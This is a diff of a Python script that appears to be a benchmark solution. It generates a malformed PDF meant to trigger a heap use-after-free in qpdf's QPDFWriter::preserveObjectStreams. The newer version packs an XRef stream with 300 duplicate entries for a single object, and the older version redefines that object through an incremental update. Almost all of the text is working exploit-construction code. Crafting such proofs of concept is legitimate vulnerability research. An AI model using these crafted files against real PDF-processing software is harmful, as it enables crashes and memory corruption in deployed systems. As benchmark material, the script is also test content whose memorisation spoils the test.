@@ -1,107 +1,84 @@
-import struct
+import sys
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # The vulnerability is a Heap Use After Free in QPDFWriter::preserveObjectStreams
-        # when dealing with multiple entries for the same object ID, particularly involving
-        # object streams.
-        # We construct a PDF 1.5 file with an object stream containing an object (ID 5),
-        # and then append an incremental update that redefines that same object (ID 5)
-        # as a regular (loose) object. This sets up the condition where the object
-        # exists in the cache from the stream but is also superseded, potentially
-        # confusing the preservation logic.
-
-        pdf = bytearray()
+        # Construct a PDF that triggers a Heap Use After Free in QPDFWriter::preserveObjectStreams
+        # caused by multiple XRef entries for the same object ID.
         
-        def add(s):
-            if isinstance(s, str):
-                pdf.extend(s.encode('latin1'))
-            else:
-                pdf.extend(s)
-                
-        # --- Part 1: Base PDF (1.5) with Object Stream ---
-        add("%PDF-1.5\n")
+        # Basic PDF Structure
+        pdf_header = b"%PDF-1.7\n%\x80\x81\x82\x83\n"
         
-        # Obj 1: Catalog
-        # We reference object 5 in the catalog to ensure it is considered reachable/processed
-        off1 = len(pdf)
-        add("1 0 obj\n<< /Type /Catalog /Pages 2 0 R /Extra 5 0 R >>\nendobj\n")
+        # Object 1: Catalog
+        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
         
-        # Obj 2: Pages
-        off2 = len(pdf)
-        add("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
+        # Object 2: Pages
+        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
         
-        # Obj 3: Page
-        off3 = len(pdf)
-        add("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n")
+        # Object 3: Page
+        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
         
-        # Obj 4: Object Stream
-        # Contains Obj 5. Stream content format: "obj_num offset ..."
-        # "5 0" means Object 5 is at offset 0 inside the decoded stream
-        stm_content = b"5 0\n(InStreamData)"
-        off4 = len(pdf)
-        add(f"4 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Length {len(stm_content)} >>\nstream\n")
-        add(stm_content)
-        add("\nendstream\nendobj\n")
+        # Object 4: Object Stream containing Object 5
+        # The content of the object stream must define object 5.
+        # "5 0" is the pair (obj_num, offset_in_first). "<<" is start of dict.
+        stm_content = b"5 0 << >>"
+        obj4 = b"4 0 obj\n<< /Type /ObjStm /N 1 /First 4 >>\nstream\n" + stm_content + b"\nendstream\nendobj\n"
         
-        # Obj 6: XRef Stream (Base XRef)
-        # We use an XRef stream to properly index the object inside the object stream (Type 2 entry)
-        # Map: 
-        # 0: Free
-        # 1: Catalog (n)
-        # 2: Pages (n)
-        # 3: Page (n)
-        # 4: ObjStm (n)
-        # 5: Compressed Object (Type 2, inside stream 4)
-        # 6: XRef Stream itself (n)
+        # Calculating offsets for the objects
+        base_offset = len(pdf_header)
+        off1 = base_offset
+        off2 = off1 + len(obj1)
+        off3 = off2 + len(obj2)
+        off4 = off3 + len(obj3)
+        off6 = off4 + len(obj4) # Object 6 (XRef) follows Object 4
         
-        # W [1 2 1] -> Fields are 1, 2, 1 bytes. 
-        # 2 bytes for offset is sufficient for this small PoC (max 65535).
+        # Constructing the XRef Stream (Object 6)
+        # We define IDs 0-6 normally.
+        # Then we add many duplicate entries for ID 5 to trigger the vulnerability.
         
-        xr = bytearray()
-        # 0: 00 0000 00 (Free)
-        xr += b'\x00\x00\x00\x00'
-        # 1: 01 off1 00 (In Use)
-        xr += b'\x01' + struct.pack('>H', off1) + b'\x00'
-        # 2: 01 off2 00
-        xr += b'\x01' + struct.pack('>H', off2) + b'\x00'
-        # 3: 01 off3 00
-        xr += b'\x01' + struct.pack('>H', off3) + b'\x00'
-        # 4: 01 off4 00
-        xr += b'\x01' + struct.pack('>H', off4) + b'\x00'
-        # 5: 02 0004 00 (Type 2: Compressed. Field 2 = Stream Obj Num (4), Field 3 = Index (0))
-        xr += b'\x02' + struct.pack('>H', 4) + b'\x00'
+        # XRef Stream Fields: W [1 2 1] (Type, Offset/ObjNum, Gen/Index)
         
-        # 6: Self reference. We calculate offset now.
-        off6 = len(pdf)
-        xr += b'\x01' + struct.pack('>H', off6) + b'\x00'
+        # Base Rows
+        rows = bytearray()
+        # ID 0: Free
+        rows += b'\x00\x00\x00\x00'
+        # ID 1: Offset off1
+        rows += b'\x01' + off1.to_bytes(2, 'big') + b'\x00'
+        # ID 2: Offset off2
+        rows += b'\x01' + off2.to_bytes(2, 'big') + b'\x00'
+        # ID 3: Offset off3
+        rows += b'\x01' + off3.to_bytes(2, 'big') + b'\x00'
+        # ID 4: Offset off4
+        rows += b'\x01' + off4.to_bytes(2, 'big') + b'\x00'
+        # ID 5: Compressed in ObjStm 4, Index 0
+        rows += b'\x02\x00\x04\x00'
+        # ID 6: Offset off6
+        rows += b'\x01' + off6.to_bytes(2, 'big') + b'\x00'
         
-        add(f"6 0 obj\n<< /Type /XRef /Size 7 /W [1 2 1] /Root 1 0 R /Length {len(xr)} >>\nstream\n")
-        add(xr)
-        add("\nendstream\nendobj\n")
+        # Base Index: [0 7] (IDs 0 to 6)
+        index_list = [0, 7]
         
-        add("startxref\n")
-        add(f"{off6}\n")
-        add("%%EOF\n")
+        # Adding duplicates for ID 5
+        # We add 300 duplicates. This ensures multiple entries logic is exercised.
+        # Each duplicate is an entry in the XRef stream data and a range in /Index.
+        # Duplicate Row: Pointing to ObjStm 4 again.
+        dup_row = b'\x02\x00\x04\x00'
         
-        # --- Part 2: Incremental Update ---
-        # We redefine Object 5 as a loose (non-compressed) object.
-        # This creates the "multiple entries" scenario (one in base via objstm, one in update).
+        num_duplicates = 300
+        for _ in range(num_duplicates):
+            index_list.extend([5, 1])
+            rows += dup_row
+            
+        # Serialize Index array
+        index_str = " ".join(map(str, index_list)).encode()
         
-        off5_new = len(pdf)
-        add("5 0 obj\n(LooseData)\nendobj\n")
+        # Construct Object 6
+        obj6_dict = (b"6 0 obj\n<< /Type /XRef /Size 7 /W [1 2 1] /Index [" + 
+                     index_str + b"] /Root 1 0 R /Length " + 
+                     str(len(rows)).encode() + b" >>\nstream\n")
         
-        # Standard XRef table for the update section
-        xref2_off = len(pdf)
-        add("xref\n")
-        add("0 1\n0000000000 65535 f \n")
-        add("5 1\n")
-        add(f"{off5_new:010} 00000 n \n")
+        obj6 = obj6_dict + rows + b"\nendstream\nendobj\n"
         
-        add("trailer\n")
-        add(f"<< /Size 7 /Root 1 0 R /Prev {off6} >>\n")
-        add("startxref\n")
-        add(f"{xref2_off}\n")
-        add("%%EOF\n")
+        # Trailer
+        trailer = b"startxref\n" + str(off6).encode() + b"\n%%EOF\n"
         
-        return bytes(pdf)
+        return pdf_header + obj1 + obj2 + obj3 + obj4 + obj6 + trailer
